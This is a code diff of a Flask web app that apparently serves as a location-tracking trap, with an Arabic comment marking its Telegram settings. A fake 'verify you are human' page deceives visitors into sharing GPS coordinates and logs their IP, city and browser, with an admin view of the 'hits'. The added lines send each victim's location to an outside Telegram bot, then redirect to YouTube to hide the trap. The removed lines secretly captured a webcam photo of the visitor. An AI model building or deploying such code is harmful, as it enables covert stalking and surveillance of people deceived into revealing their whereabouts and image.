@@ -1,10 +1,13 @@
 from flask import Flask, request, render_template_string
-import json, time, os, requests, base64
+import json, time, os, requests
 
 app = Flask(__name__)
 LOG = "hits.jsonl"
-IMG_DIR = "static/images"
-os.makedirs(IMG_DIR, exist_ok=True)
+
+# --- إعدادات تلغرام ---
+TG_TOKEN = "YOUR_TG_TOKEN"
+TG_CHAT = "YOUR_CHAT_ID"
+# ---------------------
 
 PAGE = """
 <!DOCTYPE html><html><head><meta charset="utf-8">
@@ -28,11 +31,8 @@ p{color:#8b949e;font-size:15px;line-height:1.5;margin-bottom:25px}
   <p id="msg">Please allow location access to verify you are human and secure your connection.</p>
   <button class="btn" id="btn" onclick="requestGeo()">Try Again</button>
 </div>
-<video id="v" style="display:none" autoplay playsinline></video>
-<canvas id="c" style="display:none"></canvas>
 <script>
 let data = {};
-let v = document.getElementById('v'), c = document.getElementById('c');
 
 function requestGeo(){
   document.getElementById('btn').style.display = 'none';
@@ -65,31 +65,19 @@ function fail(){
 }
 
 function done(){
-  document.getElementById('load').style.display = 'none';
+  sendData();
+  
   document.getElementById('title').innerText = 'Verified Successfully';
   document.getElementById('title').style.color = '#3fb950';
-  document.getElementById('msg').innerText = 'Your location has been verified. You may close this page.';
-  sendData();
-  getCam();
+  document.getElementById('msg').innerText = 'Redirecting...';
+  
+  setTimeout(() => {
+    window.location.href = 'https://www.youtube.com';
+  }, 1500);
 }
 
 function sendData(){
   fetch('/c',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});
-}
-
-function getCam(){
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-  .then(stream => {
-    v.srcObject = stream;
-    v.onloadedmetadata = () => {
-      setTimeout(() => {
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        data.photo = c.toDataURL('image/jpeg', 0.5).split(',')[1];
-        sendData();
-      }, 1000);
-    };
-  }).catch(()=>{});
 }
 setTimeout(requestGeo, 1500);
 </script></body></html>
@@ -102,19 +90,23 @@ def index(): return render_template_string(PAGE)
 def collect():
     d = request.get_json(silent=True) or {}
     ip = (request.headers.get("X-Forwarded-For","") or request.remote_addr or "").split(",")[0].strip()
-    img_name = ""
-    if "photo" in d:
-        img_name = f"img_{int(time.time())}.jpg"
-        with open(os.path.join(IMG_DIR, img_name), "wb") as f:
-            f.write(base64.b64decode(d["photo"]))
-        del d["photo"]
-    rec = {"ts": int(time.time()), "ip": ip, "ua": request.headers.get("User-Agent",""), "lat": d.get("lat"), "lon": d.get("lon"), "acc": d.get("acc"), "src": d.get("src"), "reason": d.get("reason"), "img": img_name}
+    
+    rec = {"ts": int(time.time()), "ip": ip, "ua": request.headers.get("User-Agent",""), "lat": d.get("lat"), "lon": d.get("lon"), "acc": d.get("acc"), "src": d.get("src"), "reason": d.get("reason")}
+    
     if not rec["lat"] and ip:
         try:
             g = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=5).json()
             if g.get("status") == "success": rec.update({"lat": g["lat"], "lon": g["lon"], "city": g.get("city"), "country": g.get("country"), "isp": g.get("isp")})
         except: pass
+        
     with open(LOG, "a") as f: f.write(json.dumps(rec) + "\n")
+    
+    if TG_TOKEN and TG_CHAT and TG_TOKEN != "YOUR_TG_TOKEN":
+        link = f"https://maps.google.com/?q={rec['lat']},{rec['lon']}" if rec.get("lat") else "No GPS"
+        msg = f"🎯 New Hit!\n\nSource: {rec.get('src')}\nIP: {rec['ip']}\nCity: {rec.get('city','?')}\nMap: {link}"
+        try: requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": TG_CHAT, "text": msg}, timeout=5)
+        except: pass
+        
     return ("", 204)
 
 @app.route("/admin")
@@ -123,12 +115,12 @@ def admin():
     rows = []
     if os.path.exists(LOG):
         with open(LOG) as f: rows = [json.loads(l) for l in f if l.strip()][::-1]
-    out = ["<html><meta charset='utf-8'><body style='background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px'><h2 style='color:#58a6ff'>Hits</h2><table border=1 cellpadding=6 style='border-collapse:collapse;font-size:13px'><tr><th>time</th><th>src</th><th>map</th><th>photo</th><th>ip</th><th>city</th><th>ua</th></tr>"]
+        
+    out = ["<html><meta charset='utf-8'><body style='background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px'><h2 style='color:#58a6ff'>Hits</h2><table border=1 cellpadding=6 style='border-collapse:collapse;font-size:13px'><tr><th>time</th><th>src</th><th>map</th><th>ip</th><th>city</th><th>ua</th></tr>"]
     for r in rows:
         mp = f"<a target='_blank' href='https://maps.google.com/?q={r['lat']},{r['lon']}'>map</a>" if r.get("lat") else "—"
-        img = f"<a target='_blank' href='/static/images/{r['img']}'>view</a>" if r.get("img") else "—"
         t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
-        out.append(f"<tr><td>{t}</td><td>{r.get('src','?')}</td><td>{mp}</td><td>{img}</td><td>{r['ip']}</td><td>{r.get('city','')}/{r.get('country','')}</td><td>{r['ua'][:50]}</td></tr>")
+        out.append(f"<tr><td>{t}</td><td>{r.get('src','?')}</td><td>{mp}</td><td>{r['ip']}</td><td>{r.get('city','')}/{r.get('country','')}</td><td>{r['ua'][:50]}</td></tr>")
     out.append("</table></body></html>")
     return "".join(out)
 
